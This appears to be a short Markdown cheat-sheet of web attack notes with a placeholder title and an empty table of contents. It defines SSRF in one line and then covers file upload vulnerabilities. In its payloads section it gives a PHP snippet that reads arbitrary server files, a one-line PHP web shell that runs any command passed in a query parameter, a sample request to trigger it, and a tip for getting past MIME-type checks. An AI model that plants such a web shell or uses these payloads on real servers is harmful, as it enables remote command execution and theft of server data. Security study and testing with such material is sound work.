---

# Table of Contents

---
- []()
  - []()
  - []()
- []()
---
# Title
---

## SSRF

**SSRF - Server-Side Request Forgery is the attack against the server, the attacker causes the application to make an HTTP request back to the server that is hosting the application**



---

## File Upload Vulnerability

**File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size.**

### Payloads

Read arbitrary files from the server's filesystem:
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```
---
Easy oneliner web-shell:
```php
<?php echo system($_GET['command']); ?>
```
This allows you to pass an arbitrary system command via a query parameter as follows:
```
GET /example/exploit.php?command=id HTTP/1.1
```
---

### Security Bypass

1. **MIME Type**. Your browser could check you file type with Content-Type header with different [MIME](https://www.sitepoint.com/mime-types-complete-list/) type value, but if you change it, you also could bypass it

---







--- 
